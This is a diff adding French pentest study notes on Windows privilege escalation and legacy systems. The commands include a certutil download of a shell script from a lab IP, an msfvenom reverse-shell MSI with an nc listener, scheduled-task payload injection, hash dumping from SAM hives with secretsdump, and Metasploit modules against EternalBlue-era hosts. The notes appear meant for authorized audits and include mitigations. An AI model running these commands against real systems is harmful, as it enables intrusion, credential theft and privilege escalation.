@@ -2383,7 +2383,172 @@ Sup9rC0mpl2xPa$$ws0921lk
 - [SharpChrome](https://github.com/djhohnstein/SharpChromium)[et](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1)
 
 
+---
 
+# Miscellaneous Techniques
+
+**But :** petites techniques utilitaires à tester lors d'une compromission Windows (transfert de fichiers, LOLBAS, MSI escalation, VHD/VMDK, scheduled tasks, etc.).
+
+## LOLBAS
+- Projet listant les binaires/scripts signés Microsoft utiles pour "living off the land" (ex: `certutil`, `rundll32`, `msiexec`, ...).
+- Utilité : exfiltrer/fournir fichiers, encoder/décoder, exécution, persistence, UAC bypass, dll-hijack.
+
+## Transfer & encode files with `certutil`
+- Télécharger un fichier depuis HTTP :
+  `certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat`
+- Encoder un fichier en base64 :
+  `certutil -encode file1 encodedfile`
+- Décoder un fichier base64 :
+  `certutil -decode encodedfile file2`
+
+## AlwaysInstallElevated (MSI privilege escalation)
+- Vérifier la politique AlwaysInstallElevated :
+  `reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`  
+  `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
+- Si les deux clés existent et valent `0x1`, les MSIs installés par un utilisateur s'exécutent en SYSTEM.
+- Générer MSI malveillant (ex : Meterpreter) :
+  `msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi`
+- Lancer l'installation depuis la cible :
+  `msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart`
+- Écouter la callback :
+  `nc -lnvp 9443`
+
+**Mitigation :** désactiver AlwaysInstallElevated en GPO/local policy.
+
+## CVE-2019-1388 (Certificate Dialog UAC issue) — résumé exploitation GUI
+- Contexte : certificat avec SpcSpAgencyInfo --> "Issued by" devient lien cliquable dans la boîte de cert.
+- Effet : clique ouvre navigateur lancé en `SYSTEM`. Depuis le navigateur -> View page source -> Save As -> `File name` permet lancer `c:\windows\system32\cmd.exe` en `SYSTEM`.
+- Vérifier si machine non patchée et tester seulement si GUI disponible et scope autorisé.
+
+## Scheduled Tasks — trouver des vecteurs via permissions faibles
+- Lister tâches accessibles :  
+  `schtasks /query /fo LIST /v`  
+  ou PowerShell : `Get-ScheduledTask | select TaskName,State`
+- Vérifier permissions sur dossiers/scripts utilisés par les tâches (ex : `C:\Scripts`) :
+  `.\accesschk64.exe /accepteula -s -d C:\Scripts\`
+- Si scripts ou dossier sont `RW` pour `BUILTIN\Users`, modifier/append un payload qui sera exécuté par la tâche au prochain run (persistence → exécution en SYSTEM).
+- Exemple d'abus : ajouter beacon ou créer utilisateur admin via script de backup.
+
+## User / Computer Description fields
+- Les admins stockent parfois des infos dans les champs Description :
+  `Get-LocalUser`  
+  `Get-WmiObject -Class Win32_OperatingSystem | select Description`
+- Vérifier pour mots de passe ou indices.
+
+## Mount VHD/VHDX/VMDK (récupérer hives, configs, clés)
+- Sur Linux (guestmount) : monter une image en lecture seule :
+  `guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk`
+  `guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1`
+- Sur Windows : clic-droit → Mount (VHD/VHDX) ou Disk Management. Ou `Mount-VHD` PowerShell.
+- Parcourir la racine montée pour `Windows\System32\config` (SAM, SYSTEM, SECURITY) ou fichiers d'application (web.config, .kdbx, .ppk).
+
+## Récupérer hashes depuis hives (après avoir copié SAM/SECURITY/SYSTEM)
+- Extraire NT hashes/local hashes avec `secretsdump.py` (Impacket) :
+  `secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL`
+- Puis cracker ou reuse.
+
+## Mount & extract quick checklist
+1. Rechercher images sur shares : `dir /s *.vhd* *.vmdk`  
+2. Copier image sur machine d'attaque si possible (ou monter réseau).  
+3. Monter (guestmount / Mount-VHD / VMware Map Virtual Disk / 7-Zip).  
+4. Récupérer `C:\Windows\System32\config\SAM`, `SYSTEM`, `SECURITY`.  
+5. `secretsdump.py` → récupérer hashes.
+
+## Techniques supplémentaires rapides
+- Exécution DLL via `rundll32.exe` : `rundll32 <dll>,<export>` (utile pour DLL-based payloads).  
+- Transférer fichiers via SMB/LOLBAS (ex: `bitsadmin`, `certutil`, `powershell -c (New-Object Net.WebClient).DownloadFile(...)`).  
+- Surveiller scheduled tasks & répertoires écrits par SYSTEM.  
+- Utiliser `accesschk` / `icacls` pour trouver ACL permissives.  
+- Chercher binaires "trusted" avec auto-elevation (LOLBAS list).
+
+---
+
+# Legacy Operating Systems
+
+**But :** comprendre les faiblesses spécifiques des anciens systèmes Windows et savoir les exploiter ou les signaler pendant un audit.
+
+## Contexte
+Même si ce module se concentre sur Windows 10 / Server 2016+, il est courant de rencontrer **systèmes anciens (EOL)** : XP, 7, Server 2003, 2008...  
+→ souvent présents dans les **universités, hôpitaux, administrations, infrastructures critiques**.
+
+**Risque principal :** absence de correctifs → vulnérabilités non patchées exploitables à distance ou localement.
+
+## Impacts des Systèmes EOL
+
+| Problème | Description |
+|-----------|--------------|
+| **Absence de support logiciel** | Applications (navigateurs, outils métiers) cessent de fonctionner. |
+| **Incompatibilité matérielle** | Nouveaux périphériques/drivers non pris en charge. |
+| **Failles de sécurité** | Pas de patchs → vulnérabilités permanentes (ex : **EternalBlue CVE-2017-0144**, **SIGRed CVE-2020-1350**). |
+
+Risque de **RCE**, **privilege escalation**, **malwares auto-propagés**.  
+Vulnérabilités exploitables **à distance** ou **localement sans interaction**.
+
+## Raisons fréquentes de leur maintien
+
+- Coûts de migration trop élevés.  
+- Logiciels métiers non supportés sur versions récentes.  
+- Fournisseurs disparus / solutions propriétaires figées.  
+- Manque de personnel technique.  
+
+**Recommandation pentest :** discuter avec le client avant exploitation (risque d’interruption de service critique).
+
+## Différences clés anciennes vs modernes
+
+| Fonctionnalité | Legacy (XP / 2003 / 2008) | Modernes (10 / 2016+) |
+|----------------|-----------------------------|------------------------|
+| **ASLR / DEP** | Faibles ou absents | Activés par défaut |
+| **UAC / Integrity Levels** | Inexistant | Présent et actif |
+| **PatchGuard / Driver Signing** | Aucun contrôle | Enforcement obligatoire |
+| **SMBv1 activé** | Oui (EternalBlue) | Désactivé par défaut |
+| **PowerShell Logging** | Non | Oui (ScriptBlock, Transcription) |
+| **Service Isolation** | Non | Présente (service SIDs, Restricted Tokens) |
+| **Credential Guard / LSASS Protection** | Absent | Présent sur Win10+ |
+| **DPAPI / Credential Encryption** | Moins robuste | Améliorée |
+| **User separation (LUA)** | Minimal | Strictement appliqué |
+
+## Points à Vérifier lors d’un Audit
+
+1. **Version & build :**
+   - `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
+   - `wmic os get Caption,CSDVersion,BuildNumber`
+2. **Patch level & hotfixes :**
+   - `wmic qfe get HotFixID,InstalledOn`
+3. **Présence SMBv1 (EternalBlue check) :**
+   - `sc query lanmanworkstation`
+   - `powershell Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`
+4. **Services obsolètes :**
+   - `net start` / `tasklist /svc`
+5. **Failles connues :**
+   - MS08-067 (XP/2003)
+   - MS17-010 (EternalBlue)
+   - MS14-068 (Kerberos)
+   - CVE-2019-0708 (BlueKeep)
+   - CVE-2020-0796 (SMBGhost)
+
+## Exploitation Classique sur Legacy Hosts
+
+| Vulnérabilité | OS ciblé | Type | Outil |
+|----------------|----------|------|-------|
+| MS08-067 | XP / 2003 | RCE | `exploit/windows/smb/ms08_067_netapi` |
+| MS17-010 (EternalBlue) | 7 / 2008 | RCE | `exploit/windows/smb/ms17_010_eternalblue` |
+| BlueKeep CVE-2019-0708 | 7 / 2008 R2 | RCE (RDP) | `rdpscan`, `metasploit` |
+| PrintNightmare CVE-2021-34527 | 10 / 2019 | PrivEsc | PoC / Metasploit |
+| Unquoted Service Paths | XP→10 | PrivEsc | manuel ou `accesschk` |
+
+## Outils utiles
+- `systeminfo`, `wmic`, `net config workstation`, `powershell Get-ComputerInfo`  
+- `nmap --script smb-os-discovery` pour identifier versions Windows à distance  
+- `metasploit`, `crackmapexec`, `smbclient`, `impacket-smbexec`, `rdpscan`  
+
+## Défense / Mitigation
+- Retirer ou **isoler** les systèmes EOL (segmentation réseau VLAN / firewall).  
+- Bloquer SMBv1 / RDP si inutile.  
+- Surveillance accrue (SIEM/EDR) sur serveurs legacy.  
+- Utiliser virtualisation isolée ou jump host limité.  
+- Établir **plan de migration** progressif (Windows 10/Server 2019+).  
+
+---
 
 
 
